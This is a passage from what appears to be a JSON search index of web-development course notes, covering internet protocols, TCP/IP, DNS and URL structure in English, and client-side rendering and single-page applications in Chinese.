centralisation tendencies may impact this. By the early 2000s, the Internet had become indispensable global infrastructure. Today, the Internet connects tens of billions of devices, including computers, smart phones, televisions, printers, fridges, watches, and most crucially... water bottles. These devices are connected using a wide range of different types of links, such as copper cables, fibre-optic cables, satellites, and phone lines.</p>"},{"location":"cs/mern/3403/l1/#what-is-a-protocol","title":"What is a protocol?","text":"<p>No matter what medium is used (fibre, satellite links, etc.), the physical connections send data as a sequence of bits. Network communication is possible only if computers \u201cspeak\u201d a common language and know how to interpret the bits. These common languages are known as protocols. On the Internet, it's \"protocols all the way down\". A protocol is a set of predefined rules that tell computers how to interpret the stream of bits being transmitted. A simple web page loading process will involve hundreds of protocols. Protocols are the lifeblood of the internet.</p> <p>\u7cbe\u7b80\u6848\u4f8b (Simplified Example):</p> <ul> <li>IP \u2013 for consistent addressing of entities on the internet.</li> <li>BGP \u2013 for finding the best routes across the internet.</li> <li>SMTP \u2013 for sending and receiving emails.</li> <li>FTP \u2013 for sending and receiving files.</li> </ul>"},{"location":"cs/mern/3403/l1/#purpose-of-tcpip","title":"Purpose of TCP/IP","text":"<p>Every computer and network on the Internet uses the same set of protocols \u2013 the Transmission Control Protocol/Internet Protocol (TCP/IP). TCP/IP was developed by DARPA to guarantee the proper transmission of data, since the physical layer in the network may be unreliable. IP is responsible for providing consistent addressing for entities on the internet. TCP is responsible for error-free delivery of streams of data. In TCP/IP, a stream of data is split into packets which are sent individually over the network. For transmission not needing guarantees (e.g., video streaming), User Datagram Protocol (UDP) can be used instead of TCP. UDP transmission is faster, with none of the error detection or correction overheads that are in TCP/IP. The TCP/IP model is split up into four layers: Application layer, Transport layer, Internet layer, and Network access layer. The Transport layer is responsible for converting the stream of data to and from a sequence of packets and for detecting and fixing packets that are lost or corrupted during transport. The Internet layer is responsible for transmitting a single packet from the source device to the destination device across the network.</p>"},{"location":"cs/mern/3403/l1/#clientserver-architecture","title":"Client/server architecture","text":"<p>Most communication on the internet takes the form of a client-server relationship. The server is a computer whose address is known, and which stores information on its file system. The client sends a request for information to the server via an agreed protocol (FTP, SMTP, etc.). The server transmits the requested information back to the clients.</p> <p>Advantages:</p> <ul> <li>Multiple clients can use a single server.</li> <li>New clients can join the system without having to be registered in advance.</li> <li>We have a single, central source of information (although this has become increasingly less true in the last 10-15 years).</li> </ul> <p>Disadvantages:</p> <ul> <li>There is a single point of failure \u2013 the server.</li> <li>If too many clients, the server may be overloaded with requests.</li> </ul> <p>To get around these disadvantages, many duplicate servers containing the same content can be used. The cost is that more work must be done to keep the copies of information synchronised. The client knows who the server is, but the server ideally handles the request and can forget about the client, which allows the architecture to scale.</p> <p>\u7cbe\u7b80\u6848\u4f8b (Simplified Example): When you type a website address into your browser, your browser is the client, sending a request to the server that hosts the website. The server receives the request, finds the relevant web page information, and sends it back to your browser (the client) to display.</p>"},{"location":"cs/mern/3403/l1/#world-wide-web","title":"World wide web","text":"<p>The World Wide Web is essentially the fragment of the internet accessible through web browsers. The World Wide Web is built on top of the Internet. The Internet is the network that allows information transfer, while the World Wide Web is a set of applications built on top of it. It provides a standardized way to access information stored on that network. It originated at CERN in 1989, invented by Tim Berners-Lee and colleagues, and was publicised in 1991. It included the first browser and the Domain Name System (DNS). In 1993, the release of the Mosaic browser (the first multimedia browser) led to an explosion in internet use. The World Wide Web was called the \"killer app\" of the 90s. It is a unique engineering environment with obscure ownership and control. Many consider it one of the most impressive pieces of infrastructure ever built by humanity. Hundreds of standards define interaction over web pages. Today, due to the popularity of search, URLs are nearly irrelevant to users.</p> <p>\u7b80\u8981\u5386\u53f2\u6f14\u53d8 (Brief Historical Evolution):</p> <ul> <li>Early internet: Mainly used by technical people in universities and research labs. Accessing information was difficult (needed IP address), and there was no uniform way of visualising information.</li> <li>World Wide Web: Introduced DNS and browsers, making information access easy (no need to remember IP addresses, browser handles rendering). Seamless navigation between different pieces of information was enabled by hyperlinks.</li> <li>Static Web: Late 20th century, users primarily accessed static information on servers in a \"read-only\" mode.</li> <li>Social Web: Early 21st century, technology allowed users to store their own information on servers and create user-generated content (e.g., social media, blogs).</li> <li>Personalized Web: In the last five years or so, the web started responding personally to users' interests, with tailored search results and services offered. The advent of large language models aggregates information and extracts semantic content.</li> </ul>"},{"location":"cs/mern/3403/l1/#purpose-of-dns","title":"Purpose of DNS","text":"<p>DNS stands for Domain Name System. Its purpose is to resolve URLs (human-readable names) to IP addresses. With DNS, users no longer need to remember complex numerical IP addresses but can use easier-to-remember domain names to access specific servers on the Internet. Your computer and router will use DNS to determine which server on the Internet the information needs to be sent to.</p> <p>\u7cbe\u7b80\u6848\u4f8b (Simplified Example): When you visit <code>google.com</code>, your computer doesn't connect directly to something called \"google.com\". It sends a request to a DNS server asking: \"What is the IP address for <code>google.com</code>?\" The DNS server returns a numerical IP address (e.g., <code>172.217.160.142</code>), and your computer then uses this IP address to connect to Google's servers.</p>"},{"location":"cs/mern/3403/l1/#url-structure","title":"URL structure","text":"<p>URL stands for Uniform Resource Locator. It is a human-readable format used for addressing World Wide Web servers.</p> <p>A typical URL structure example is: <code>http://www.domain.edu.au:1000/path/to/file?parameters=true#fragment</code>.</p> <p>The URL contains the following parts:</p> <ul> <li>Protocol: The protocol being used, typically <code>http</code>, <code>ftp</code>, <code>https</code>, etc..</li> <li>Domain name: The domain name, mapped to an IP address by a DNS server. E.g., <code>www.domain.edu.au</code>.</li> <li>Port number: The port number, servers have ports 0-65535, but HTTP defaults to port 80.</li> <li>Path: The path to the file to be executed or retrieved (or code/function to be run on the server). E.g., <code>/path/to/file</code>. This often points to code/functions rather than physical files.</li> <li>Parameters: Parameters of the request, specified as key-value pairs. These parameters can change how the server renders content or what information it sends. E.g., <code>parameters=true</code>.</li> <li>Fragment: The fragment, anchoring to a location in a page. E.g., <code>#fragment</code>.</li> </ul> <p>There are also hidden parts of the URL, including the browser name and cookies.</p>"},{"location":"cs/mern/3403/l1/#client-server-architecture-in-the-world-wide-web","title":"Client-server architecture in the world wide web","text":"<p>In the World Wide Web, the client-server architecture is almost universally used. Communication is by an agreed protocol, e.g., the HTTP (HyperText Transfer Protocol). The servers store the web pages (information), typically as HTML files (although a web page consists of multiple files including CSS, JavaScript, images, etc.). The user requests a web page through the browser, a program running locally on their computer (acting as the client). The browser locates the correct server and communicates the request. The server retrieves the web page from its local file system or constructs it based on information and parameters. The server transmits the files (usually text files containing HTML instructions) back to the browser. The browser receives the files and uses them to render the web page. Modern World Wide Web servers are typically many computers stacked in data centres, capable of handling massive requests and scaling proportionally.</p>"},{"location":"cs/mern/3403/l10/","title":"10.0 Client Side Rendering","text":"<p>\u672c\u8bb2\u5ea7\u6db5\u76d6\u4e86\u5ba2\u6237\u7aef\u6e32\u67d3\uff08Client-Side Rendering, CSR\uff09\u3001\u5355\u9875\u5e94\u7528\uff08Single Page Applications, SPA\uff09\u4ee5\u53ca Web Socket \u8fd9\u4e09\u4e2a\u6838\u5fc3\u6982\u5ff5\u3002\u7406\u89e3\u5b83\u4eec\u7684\u5de5\u4f5c\u539f\u7406\u3001\u4f18\u7f3a\u70b9\u4ee5\u53ca\u9002\u7528\u573a\u666f\u662f\u672c\u8bfe\u7a0b\u7684\u91cd\u8981\u8003\u70b9\u3002</p>"},{"location":"cs/mern/3403/l10/#1","title":"1. \u4ec0\u4e48\u662f\u5ba2\u6237\u7aef\u6e32\u67d3\u53ca\u5176\u5de5\u4f5c\u539f\u7406\uff08\u9ad8\u5c42\u6b21\u7406\u89e3\uff09","text":"<p>\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u770b\u5230\u7684 JavaScript \u4e3b\u8981\u54cd\u5e94\u6d4f\u89c8\u5668\u4e2d\u7684\u672c\u5730\u4e8b\u4ef6\uff0c\u4f8b\u5982\u7528\u6237\u70b9\u51fb\u6309\u94ae\u3001\u9875\u9762\u52a0\u8f7d\u548c\u9f20\u6807\u79fb\u52a8\u7b49\u3002\u7136\u800c\uff0c\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u54cd\u5e94\u8fdc\u7a0b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u6709\u4eba\u7ed9\u4f60\u53d1\u6d88\u606f\u3001\u70b9\u8d5e\u5e16\u5b50\u7b49\u3002\u6b64\u5916\uff0c\u6709\u65f6\u6211\u4eec\u4e5f\u9700\u8981\u5229\u7528\u670d\u52a1\u5668\u4e0a\u7684\u4fe1\u606f\u6765\u52a8\u6001\u54cd\u5e94\u672c\u5730\u4e8b\u4ef6\uff0c\u4f8b\u5982\u5982\u679c\u7528\u6237\u8f93\u5165 4 \u6708 1 \u65e5\u4f5c\u4e3a\u9996\u9009\u9884\u7ea6\u65e5\u671f\uff0c\u6211\u4eec\u5e0c\u671b\u7acb\u5373\u5411\u4ed6\u4eec\u663e\u793a\u53ef\u7528\u7684\u53ef\u7528\u9884\u7ea6\u65f6\u95f4\u3002</p> <p>\u5904\u7406\u8fd9\u79cd\u9700\u6c42\u7684\u4e00\u79cd\u65b9\u5f0f\u662f\u5c06\u65e5\u671f\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u8ba9\u670d\u52a1\u5668\u91cd\u65b0\u6784\u5efa\u6574\u4e2a\u9875\u9762\uff0c\u7136\u540e\u5c06\u6574\u4e2a\u9875\u9762\u53d1\u9001\u56de\u6d4f\u89c8\u5668\u3002\u4f46\u5f88\u591a\u65f6\u5019\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4f20\u8f93\u5c11\u91cf\u7684\u6570\u636e\uff08\u4f8b\u5982\uff0c\u53ea\u6709\u51e0\u4e2a\u5b57\u8282\uff09\u5c31\u53ef\u4ee5\u5b9e\u73b0\u9875\u9762\u7684\u90e8\u5206\u66f4\u65b0\u3002\u5ba2\u6237\u7aef\u6e32\u67d3\u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u800c\u8bde\u751f\u7684\uff0c\u5176\u6838\u5fc3\u76ee\u6807\u662f\u4f7f\u7528\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u4e4b\u95f4\u53d1\u9001\u7684\u6700\u5c0f\u6570\u636e\u91cf\u6765\u66f4\u65b0\u9875\u9762\u3002</p> <p>\u5728\u9ad8\u5c42\u6b21\u4e0a\uff0c\u5ba2\u6237\u7aef\u6e32\u67d3\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <ul> <li>\u9996\u5148\uff0c\u670d\u52a1\u5668\u4f1a\u5c06\u521d\u59cb\u7684 HTML\u3001CSS \u548c JavaScript \u4ee3\u7801\u53d1\u9001\u5230\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u3002\u4e0e\u670d\u52a1\u5668\u7aef\u6e32\u67d3\u4e0d\u540c\uff0c\u901a\u5e38\u53d1\u9001\u7ed9\u6bcf\u4e2a\u5ba2\u6237\u7aef\u7684\u521d\u59cb\u6a21\u677f\u662f\u76f8\u540c\u7684\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u9759\u6001\u6587\u4ef6\u3002Flask \u9879\u76ee\u4e2d\u7684 \"static\" \u76ee\u5f55\u5c31\u662f\u7528\u6765\u5b58\u653e\u8fd9\u4e9b\u9759\u6001\u6587\u4ef6\u7684\u3002</li> <li>\u5ba2\u6237\u7aef\u7684 JavaScript \u4ee3\u7801\u63a5\u6536\u5230\u9875\u9762\u540e\uff0c\u53ef\u4ee5\u64cd\u7eb5\u6587\u6863\u5bf9\u8c61\u6a21\u578b (DOM) \u6765\u52a8\u6001\u5730\u6784\u5efa\u6216\u4fee\u6539\u9875\u9762\u7ed3\u6784\u3002</li> <li>\u5f53\u7528\u6237\u8fdb\u884c\u4ea4\u4e92\uff08\u4f8b\u5982\uff0c\u70b9\u51fb\u6309\u94ae\u3001\u8f93\u5165\u6587\u672c\uff09\u6216\u9700\u8981\u4ece\u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\u65f6\uff0c\u5ba2\u6237\u7aef\u7684 JavaScript \u4f1a\u4f7f\u7528 AJAX (Asynchronous JavaScript and XML) \u6280\u672f\u5411\u670d\u52a1\u5668\u53d1\u9001\u5f02\u6b65\u8bf7\u6c42\u3002</li> <li>\u670d\u52a1\u5668\u63a5\u6536\u5230 AJAX \u8bf7\u6c42\u540e\uff0c\u4f1a\u5904\u7406\u8bf7\u6c42\u5e76\u8fd4\u56de\u6240\u9700\u7684\u6570\u636e\uff0c\u901a\u5e38\u662f\u683c\u5f0f\u5316\u7684\u6570\u636e\uff0c\u6bd4\u5982 JSON \u5bf9\u8c61\u3002</li> <li>\u5ba2\u6237\u7aef\u7684 JavaScript \u63a5\u6536\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u540e\uff0c\u4f1a\u89e3\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u7136\u540e\u4f7f\u7528 JavaScript \u548c DOM \u6765\u52a8\u6001\u66f4\u65b0\u9875\u9762\u4e0a\u7684\u7279\u5b9a\u90e8\u5206\uff0c\u800c\u65e0\u9700\u91cd\u65b0\u52a0\u8f7d\u6574\u4e2a\u9875\u9762\u3002</li> </ul> <p>Wordle \u6e38\u620f\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u5ba2\u6237\u7aef\u6e32\u67d3\u793a\u4f8b\u3002\u5f53\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u731c\u6d4b\u65f6\uff0c\u5ba2\u6237\u7aef JavaScript \u4f1a\u63d0\u53d6\u731c\u6d4b\uff0c\u7136\u540e\u901a\u8fc7 AJAX \u8bf7\u6c42\u5c06\u5176\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u670d\u52a1\u5668\u63a5\u6536\u5230\u731c\u6d4b\u540e\uff0c\u4f1a\u5bf9\u7167\u79d8\u5bc6\u7b54\u6848\uff08\u4e3a\u4fdd\u8bc1\u6e38\u620f\u5b8c\u6574\u6027\uff0c\u7b54\u6848\u5b58\u50a8\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\u4e2d\u4ee5\u5b9e\u73b0\u6301\u4e45\u5316\uff09\u8ba1\u7b97\u731c\u6d4b\u7ed3\u679c\uff08\u4e00\u4e2a\u5305\u542b 0\u30011\u30012 \u7b49\u6570\u5b57\u7684\u6570\u7ec4\uff0c\u4ee3\u8868\u5b57\u6bcd\u7684\u72b6\u6001\uff1a\u6b63\u786e\u5b57\u6bcd\u6b63\u786e\u4f4d\u7f6e\u3001\u6b63\u786e\u5b57\u6bcd\u9519\u8bef\u4f4d\u7f6e\u3001\u9519\u8bef\u5b57\u6bcd\uff09\u3002\u670d\u52a1\u5668\u5c06\u7ed3\u679c\u6253\u5305\u6210 JSON \u5bf9\u8c61\u53d1\u9001\u56de\u5ba2\u6237\u7aef\u3002\u5ba2\u6237\u7aef\u63a5\u6536\u5230 JSON \u540e\uff0c\u89e3\u6790\u6570\u636e\uff0c\u7136\u540e\u6839\u636e\u7ed3\u679c\u6570\u7ec4\u52a8\u6001\u66f4\u65b0 DOM\uff0c\u4f8b\u5982\u901a\u8fc7\u6dfb\u52a0 CSS \u7c7b\u6765\u6539\u53d8\u731c\u6d4b\u5b57\u6bcd\u683c\u5b50\u7684\u989c\u8272\uff08\u7eff\u8272\u3001\u9ec4\u8272\u6216\u7070\u8272\uff09\u3002</p> <p>\u5ba2\u6237\u7aef\u6e32\u67d3\u4f7f\u5f97\u9875\u9762\u66f4\u65b0\u66f4\u52a0\u6d41\u7545\u548c\u5feb\u901f\uff0c\u56e0\u4e3a\u5b83\u53ea\u4f20\u8f93\u5c11\u91cf\u6570\u636e\u5e76\u53ea\u66f4\u65b0\u9875\u9762\u7684\u90e8\u5206\u5185\u5bb9\u3002\u7136\u800c\uff0c\u5b83\u4e5f\u9700\u8981\u5728\u5ba2\u6237\u7aef\u7f16\u5199\u66f4\u590d\u6742\u7684 JavaScript \u903b\u8f91\u6765\u7ba1\u7406\u9875\u9762\u72b6\u6001\u548c DOM \u64cd\u4f5c\u3002\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u4e4b\u95f4\u9700\u8981\u5c31\u6570\u636e\u683c\u5f0f\u548c\u542b\u4e49\u8fbe\u6210\u4e00\u81f4\uff0c\u8fd9\u5b9e\u9645\u4e0a\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u901a\u4fe1\u534f\u8bae\uff08\u4f8b\u5982 Wordle \u4e2d\u7528 0\u30011\u30012 \u8868\u793a\u731c\u6d4b\u7ed3\u679c\uff09\u3002</p>"},{"location":"cs/mern/3403/l10/#2","title":"2. \u5ba2\u6237\u7aef\u6e32\u67d3\u4e0e\u670d\u52a1\u5668\u7aef\u6e32\u67d3\u7684\u5bf9\u6bd4","text":"<ul> <li>\u670d\u52a1\u5668\u7aef\u6e32\u67d3 (SSR)\uff1a\u670d\u52a1\u5668\u8d1f\u8d23\u5927\u90e8\u5206\u5de5\u4f5c\u3002\u5b83\u4f7f\u7528\u6a21\u677f\u5f15\u64ce\uff08\u5982 Jinja\uff09\u7ed3\u5408\u7279\u5b9a\u6570\u636e\u6765\u751f\u6210\u5b8c\u6574\u7684 HTML \u9875\u9762\uff0c\u7136\u540e\u5c06\u751f\u6210\u7684 HTML \u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\u3002\u5982\u679c\u9700\u8981\u66f4\u65b0\u9875\u9762\u4e0a\u7684\u4efb\u4f55\u5185\u5bb9\uff0c\u901a\u5e38\u9700\u8981\u91cd\u65b0\u751f\u6210\u5e76\u53d1\u9001\u6574\u4e2a\u9875\u9762\uff0c\u8fd9\u662f\u975e\u5e38\u91cd\u91cf\u7ea7\u4e14\u6602\u8d35\u7684\uff08\u5c31\u5f00\u53d1\u5de5\u4f5c\u91cf\u548c\u5e26\u5bbd\u800c\u8a00\uff09\u3002\u6bcf\u6b21\u66f4\u65b0\u90fd\u9700\u8981\u53d1\u9001\u5927\u91cf\u6570\u636e\uff0c\u5bfc\u81f4\u5ef6\u8fdf\u3002</li> <li>\u5ba2\u6237\u7aef\u6e32\u67d3 (CSR)\uff1a\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a\u57fa\u672c\u7684 HTML \u9aa8\u67b6\u4ee5\u53ca CSS \u548c JavaScript \u6587\u4ef6\u3002\u9875\u9762\u7684\u5927\u90e8\u5206\u5185\u5bb9\u7531\u5ba2\u6237\u7aef\u7684 JavaScript \u6839\u636e\u4ece\u670d\u52a1\u5668\u5f02\u6b65\u83b7\u53d6\u7684\u6570\u636e\u52a8\u6001\u751f\u6210\u548c\u586b\u5145\u3002\u9875\u9762\u66f4\u65b0\u901a\u8fc7\u53d1\u9001\u5c11\u91cf\u6570\u636e\u5e76\u4ec5\u4fee\u6539 DOM \u7684\u7279\u5b9a\u90e8\u5206\u6765\u5b8c\u6210\u3002</li> </ul> <p>\u4e3b\u8981\u533a\u522b\u548c\u6bd4\u8f83\uff1a</p> <ul> <li>\u6548\u7387/\u5e26\u5bbd\uff1a CSR \u901a\u5e38\u6bd4 SSR \u66f4\u9ad8\u6548\uff0c\u56e0\u4e3a\u5b83\u5728\u9875\u9762\u66f4\u65b0\u65f6\u53ea\u4f20\u8f93\u5c11\u91cf\u5fc5\u8981\u7684\u6570\u636e\uff08\u5982 JSON\uff09\uff0c\u800c SSR \u9700\u8981\u4f20\u8f93\u6574\u4e2a\u9875\u9762\u7684 HTML\u3002\u670d\u52a1\u5668\u7684\u8d1f\u8f7d\u4e5f\u76f8\u5bf9\u8f83\u5c0f\uff0c\u53ef\u4ee5\u54cd\u5e94\u66f4\u591a\u5ba2\u6237\u7aef\u3002</li> <li>\u590d\u6742\u6027\uff1a CSR \u9700\u8981\u5728\u5ba2\u6237\u7aef\u7f16\u5199\u66f4\u590d\u6742\u7684 JavaScript \u4ee3\u7801\u6765\u5904\u7406\u6570\u636e\u3001\u66f4\u65b0 DOM \u548c\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u72b6\u6001\u3002\u5f00\u53d1\u4eba\u5458\u9700\u8981\u624b\u52a8\u64cd\u4f5c DOM\uff0c\u800c SSR \u53ef\u4ee5\u5229\u7528\u6a21\u677f\u5f15\u64ce\u63d0\u4f9b\u7684\u4fbf\u5229\u3002</li> <li>\u521d\u59cb\u52a0\u8f7d\u65f6\u95f4\uff1a SSR \u5728\u670d\u52a1\u5668\u4e0a\u9884\u751f\u6210 HTML\uff0c\u901a\u5e38\u53ef\u4ee5\u66f4\u5feb\u5730\u5c06\u5185\u5bb9\u5448\u73b0\u5728\u7528\u6237\u5c4f\u5e55\u4e0a\u3002CSR \u9700\u8981\u5148\u4e0b\u8f7d\u3001\u89e3\u6790\u548c\u6267\u884c JavaScript \u4ee3\u7801\uff0c\u7136\u540e\u518d\u83b7\u53d6\u6570\u636e\u5e76\u6784\u5efa\u9875\u9762\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u521d\u59cb\u52a0\u8f7d\u65f6\u95f4\u53d8\u957f\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\u800c\u8a00\u3002</li> <li>\u81ea\u5b9a\u4e49\u534f\u8bae\uff1a CSR \u901a\u5e38\u9700\u8981\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u4e4b\u95f4\u5b9a\u4e49\u81ea\u5b9a\u4e49\u7684\u6570\u636e\u4ea4\u6362\u534f\u8bae\u3002</li> <li>\u54cd\u5e94\u6027\uff1a CSR \u53ef\u4ee5\u63d0\u4f9b\u66f4\u6d41\u7545\u3001\u54cd\u5e94\u66f4\u5feb\u7684\u7528\u6237\u4f53\u9a8c\uff0c\u56e0\u4e3a\u9875\u9762\u66f4\u65b0\u65e0\u9700\u5b8c\u6574\u7684\u9875\u9762\u91cd\u65b0\u52a0\u8f7d\u3002</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u670d\u52a1\u5668\u7aef\u6e32\u67d3\u548c\u5ba2\u6237\u7aef\u6e32\u67d3\u5e76\u975e\u4e92\u65a5\uff0c\u53ef\u4ee5\u5728\u540c\u4e00\u4e2a\u5e94\u7528\u4e2d\u7ed3\u5408\u4f7f\u7528\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u4f7f\u7528 SSR \u751f\u6210\u521d\u59cb\u9875\u9762\uff0c\u7136\u540e\u4f7f\u7528 CSR \u6765\u5904\u7406\u540e\u7eed\u7684\u52a8\u6001\u4ea4\u4e92\u548c\u66f4\u65b0\u3002</p>"},{"location":"cs/mern/3403/l10/#3-single-page-applications-spa","title":"3. \u5355\u9875\u5e94\u7528 (Single Page Applications, SPA)","text":"<p>\u5355\u9875\u5e94\u7528\u662f\u5ba2\u6237\u7aef\u6e32\u67d3\u7684\u4e00\u79cd\u6781\u81f4\u5e94\u7528\u3002\u5728 SPA \u4e2d\uff0c\u6574\u4e2a\u7f51\u7ad9\u901a\u5e38\u7531\u4e00\u4e2a HTML \u9875\u9762\u63d0\u4f9b\u3002\u6240\u6709\u7684\u9875\u9762\u5185\u5bb9\u548c\u89c6\u56fe\u5207\u6362\u90fd\u662f\u901a\u8fc7\u5ba2\u6237\u7aef JavaScript \u52a8\u6001\u52a0\u8f7d\u548c\u6e32\u67d3\u6765\u5b9e\u73b0\u7684\u3002\u6d4f\u89c8\u5668\u6216\u5ba2\u6237\u7aef\u627f\u62c5\u4e86\u5927\u90e8\u5206\u7684\u903b\u8f91\u548c\u6e32\u67d3\u5de5\u4f5c\uff0c\u800c\u670d\u52a1\u5668\u4e3b\u8981\u53ea\u8d1f\u8d23\u63d0\u4f9b\u6570\u636e\uff08\u901a\u5e38\u901a\u8fc7 API\uff09\u3002\u7528\u6237\u5728 SPA \u4e2d\u6d4f\u89c8\u65f6\uff0c\u770b\u8d77\u6765\u53ef\u80fd\u5728\u4e0d\u540c\u7684\u201c\u9875\u9762\u201d\u4e4b\u95f4\u5207\u6362\uff0c\u4f46\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5bfc\u822a\u5230\u65b0\u7684 URL\uff08\u6216 URL \u4f1a\u53d8\u5316\uff0c\u4f46\u6ca1\u6709\u89e6\u53d1\u6d4f\u89c8\u5668\u5b8c\u6574\u7684\u9875\u9762\u91cd\u65b0\u52a0\u8f7d\uff09\u3002</p> <p>LMS \u7cfb\u7edf\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684\u5355\u9875\u5e94\u7528\u793a\u4f8b\u3002\u5f53\u4f60\u4f7f\u7528 LMS \u65f6\uff0c\u5373\u4f7f\u5728\u4e0d\u540c\u8bfe\u7a0b\u3001\u4e0d\u540c\u9875\u9762\u4e4b\u95f4\u5207\u6362\uff0c\u6d4f\u89c8\u5668\u7684 URL \u53ef\u80fd\u53d8\u5316\uff0c\u4f46\u9875\u9762\u5e76\u6ca1\u6709\u8fdb\u884c\u5b8c\u6574\u7684\u91cd\u8f7d\u3002</p> <p>\u5355\u9875\u5e94\u7528\u7684\u4f18\u70b9 (Pros of SPA):</p> <ul> <li>\u51cf\u8f7b\u670d\u52a1\u5668\u8d1f\u8f7d\uff1a \u5ba2\u6237\u7aef\u627f\u62c5\u4e86\u5927\u90e8\u5206\u6e32\u67d3\u548c\u903b\u8f91\u5de5\u4f5c\uff0c\u670d\u52a1\u5668\u53ea\u9700\u8981\u54cd\u5e94\u6570\u636e\u8bf7\u6c42\uff0c\u56e0\u6b64\u670d\u52a1\u5668\u8d1f\u8f7d\u964d\u4f4e\uff0c\u53ef\u4ee5\u670d\u52a1\u66f4\u591a\u5ba2\u6237\u7aef\u3002</li> <li>\u66f4\u5feb\u7684\u5ba2\u6237\u7aef\u54cd\u5e94\uff08\u7406\u8bba\u4e0a\uff09\uff1a \u4e00\u65e6\u521d\u59cb\u9875\u9762\u52a0\u8f7d\u5b8c\u6210\uff0c\u540e\u7eed\u7684\u89c6\u56fe\u5207\u6362\u548c\u5185\u5bb9\u66f4\u65b0\u65e0\u9700\u7b49\u5f85\u670d\u52a1\u5668\u53d1\u9001\u6574\u4e2a\u65b0\u9875\u9762\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u63d0\u4f9b\u66f4\u6d41\u7545\u3001\u66f4\u5feb\u7684\u7528\u6237\u4f53\u9a8c\u3002</li> <li>\u5185\u5bb9\u4e0e\u5c55\u793a\u7684\u771f\u6b63\u5206\u79bb\uff1a \u670d\u52a1\u5668\u53ea\u5173\u6ce8\u6570\u636e\u5185\u5bb9\uff0c\u5ba2\u6237\u7aef\uff08SPA\uff09\u8d1f\u8d23\u5982\u4f55\u5c55\u793a\u8fd9\u4e9b\u6570\u636e\uff0c\u8fd9\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6e05\u6670\u7684\u62bd\u8c61\u5c42\u3002\u8fd9\u79cd\u67b6\u6784\u4e5f\u4f7f\u5f97\u4f7f\u7528\u540c\u4e00\u4e2a\u540e\u7aef API \u4e3a Web \u5e94\u7528\u548c\u539f\u751f\u79fb\u52a8\u5e94\u7528\u63d0\u4f9b\u6570\u636e\u6210\u4e3a\u53ef\u80fd\u3002</li> </ul> <p>\u5355\u9875\u5e94\u7528\u7684\u7f3a\u70b9 (Cons of SPA):</p> <ul> <li>\u521d\u59cb\u52a0\u8f7d\u65f6\u95f4\u957f\uff1a \u9700\u8981\u4f20\u8f93\u5927\u91cf\u7684 JavaScript \u4ee3\u7801\u5230\u5ba2\u6237\u7aef\u5e76\u5728\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u9996\u6b21\u52a0\u8f7d\u65f6\u95f4\u6bd4\u4f20\u7edf\u7684\u591a\u9875\u5e94\u7528\u8981\u957f\u3002\u52a8\u6001\u6e32\u67d3\u5927\u91cf\u7684 HTML \u548c CSS \u5982\u679c\u5904\u7406\u4e0d\u5f53\uff0c\u5728\u6d4f\u89c8\u5668\u4e2d\u53ef\u80fd\u4f1a\u6bd4\u8f83\u6162\u3002</li> <li>\u641c\u7d22\u5f15\u64ce\u4f18\u5316 (SEO) \u95ee\u9898\uff1a \u4f20\u7edf\u7684\u641c\u7d22\u5f15\u64ce\u722c\u866b\u4e3b\u8981\u8bfb\u53d6\u9875\u9762\u521d\u59cb\u7684 HTML \u5185\u5bb9\u3002SPA \u9996\u6b21\u52a0\u8f7d\u65f6\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u7a7a\u7684 HTML \u9aa8\u67b6\uff0c\u5927\u90e8\u5206\u5185\u5bb9\u7531 JavaScript \u52a8\u6001\u751f\u6210\u3002\u7531\u4e8e\u722c\u866b\u901a\u5e38\u4e0d\u6267\u884c\u590d\u6742\u7684 JavaScript \u4ee3\u7801\u6216\u6a21\u62df\u7528\u6237\u4ea4\u4e92\uff0c\u5b83\u4eec\u53ef\u80fd\u65e0\u6cd5\u6293\u53d6\u548c\u7d22\u5f15 SPA \u7684\u52a8\u6001\u5185\u5bb9\uff0c\u5bfc\u81f4 SEO \u56f0\u96be\u3002</li> <li>\u5bfc\u822a\u95ee\u9898\uff1a \u6d4f\u89c8\u5668\u7684\u524d\u8fdb\u548c\u540e\u9000\u6309\u94ae\u3001\u4ee5\u53ca\u9875\u9762\u5237\u65b0\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002\u6d4f\u89c8\u5668\u53ef\u80fd\u65e0\u6cd5\u6b63\u786e\u8ddf\u8e2a SPA 